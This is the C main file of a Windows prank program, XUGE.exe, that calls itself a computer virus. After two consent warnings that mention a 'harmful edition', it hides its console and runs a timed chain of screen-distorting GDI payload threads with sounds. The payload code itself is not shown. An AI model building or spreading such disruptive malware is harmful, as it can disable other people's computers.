#include"resource.h"
#include"def.h"
#include"sound.h"
#include"payload.h"
void clean(){
	for(int i=0;i<75;i++){
		InvalidateRect(0,0,0);
	}
}
void RunPayload(){
	sound1();
	HANDLE sh1=CreateThread(NULL,0,GDIShader1,NULL,0,NULL);
	HANDLE big=CreateThread(NULL,0,Payload1a_Big,NULL,0,NULL);
	Sleep(30000);
	TerminateThread(big,0);
	TerminateThread(sh1,0);
	clean();
	Sleep(10);
	sound2();
	HANDLE sh2=CreateThread(NULL,0,GDIShader2,NULL,0,NULL);
	HANDLE move=CreateThread(NULL,0,Payload2a_Move,NULL,0,NULL);
	Sleep(30000);
	TerminateThread(sh2,0);
	TerminateThread(move,0);
	clean();
	Sleep(10);
	sound3();
	HANDLE cimelt=CreateThread(NULL,0,Payload3a_CircleMelt,NULL,0,NULL);
	Sleep(30000);
	TerminateThread(cimelt,0);
	clean();
	Sleep(10);
	sound4();
	HANDLE wind=CreateThread(NULL,0,Payload4a_Wind,NULL,0,NULL);
	Sleep(30000);
	TerminateThread(wind,0);
	clean();
	Sleep(10);
	sound5();
	HANDLE sh3=CreateThread(NULL,0,GDIShader3,NULL,0,NULL);
	Sleep(30000);
	TerminateThread(sh3,0);
	clean();
	Sleep(10);
	sound6();
	HANDLE sh4=CreateThread(NULL,0,GDIShader4,NULL,0,NULL);
	Sleep(30000);
	TerminateThread(sh4,0);
	clean();
	Sleep(10);
	sound7();
	HANDLE sh5=CreateThread(NULL,0,GDIShader5,NULL,0,NULL);
	Sleep(30000);
	TerminateThread(sh5,0);
	clean();
	Sleep(10);
	sound8();
	HANDLE sh6=CreateThread(NULL,0,GDIShader6,NULL,0,NULL);
	Sleep(30000);
	TerminateThread(sh6,0);
	clean();
	Sleep(10);
	sound9();
	HANDLE sh7=CreateThread(NULL,0,GDIShader7,NULL,0,NULL);
	Sleep(30000);
	TerminateThread(sh7,0);
	clean();
	Sleep(10);
	sound10();
	HANDLE sh8=CreateThread(NULL,0,GDIShader8,NULL,0,NULL);
	Sleep(30000);
	TerminateThread(sh8,0);
	clean();
	Sleep(10);
	sound11();
	HANDLE sh9=CreateThread(NULL,0,GDIShader9,NULL,0,NULL);
	Sleep(30000);
	TerminateThread(sh9,0);
	clean();
	Sleep(10);
	sound12();
	HANDLE sh10=CreateThread(NULL,0,GDIShader10,NULL,0,NULL);
	Sleep(30000);
	TerminateThread(sh10,0);
	clean();
	Sleep(10);
	sound13();
	HANDLE cube=CreateThread(NULL,0,Payload5a_Cube,NULL,0,NULL);
	Sleep(30000);
	TerminateThread(cube,0);
	clean();
	Sleep(10);
	sound14();
	HANDLE icon=CreateThread(NULL,0,Payload6a_Icon,NULL,0,NULL);
	HANDLE sh11=CreateThread(NULL,0,GDIShader11,NULL,0,NULL);
	Sleep(30000);
	TerminateThread(icon,0);
	TerminateThread(sh11,0);
	clean();
	Sleep(10);
	sound15();
	HANDLE swirl=CreateThread(NULL,0,Payload7a_Swirl,NULL,0,NULL);
	Sleep(30000);
	TerminateThread(swirl,0);
	clean();
	Sleep(10);
	sound16();
	HANDLE sh12=CreateThread(NULL,0,GDIShader12,NULL,0,NULL);
	Sleep(30000);
	TerminateThread(sh12,0);
	clean();
	Sleep(10);
	sound17();
	HANDLE sh13=CreateThread(NULL,0,GDIShader13,NULL,0,NULL);
	Sleep(30000);
	TerminateThread(sh13,0);
	clean();
	Sleep(10);
	sound18();
	HANDLE sh14=CreateThread(NULL,0,GDIShader14,NULL,0,NULL);
	Sleep(30000);
	TerminateThread(sh14,0);
	clean();
	Sleep(10);
	sound19();
	HANDLE sh15=CreateThread(NULL,0,GDIShader15,NULL,0,NULL);
	Sleep(30000);
	TerminateThread(sh15,0);
	clean();
	Sleep(10);
	sound20();
	HANDLE sh16=CreateThread(NULL,0,GDIShader16,NULL,0,NULL);
	Sleep(30000);
	TerminateThread(sh16,0);
	clean();
	Sleep(10);
}
int main(){
	InitDPI();
	srand(time(NULL));
	SeedXorshift32((DWORD)time(NULL));
	ShowWindow(GetConsoleWindow(),SW_HIDE);
	if(MessageBoxW(NULL,L"Warning! This program is a computer virus. It may make your computer cannot work normally. Whether to run or not?\n\nPlease don't maliciously open this program on other people's or public computers! If you accidentally opened it, please click the 'No' button to cancel the run. If you want to run it, please make sure you are running it on your own computer, or ensure that the virus on this computer is in a secure environment (such as a virtual machine, sandbox, etc.) and turn off all antivirus software. If you are running this program on other people's or public computers, please make sure you are running the harmless edition of this program, and then click the 'Yes' button to continue.", L"XUGE.exe -- WARNING", MB_YESNO|MB_ICONWARNING|MB_DEFBUTTON2)==IDYES){
		if (MessageBoxW(NULL, L"This is the last warning!!!\n\n\Do you want to really run? After running, your computer may not work normally! If you run the harmful edition of this program on other people's or public computers, you will be responsible for any losses and legal liabilities caused by running this program! The writer of this computer virus isn't responsible!!!", L"XUGE.exe -- WARNING", MB_YESNO | MB_ICONWARNING | MB_DEFBUTTON2) == IDYES){
			Sleep(1000);
			RunPayload();
//			_getch();
		}
	}
	return 0;
}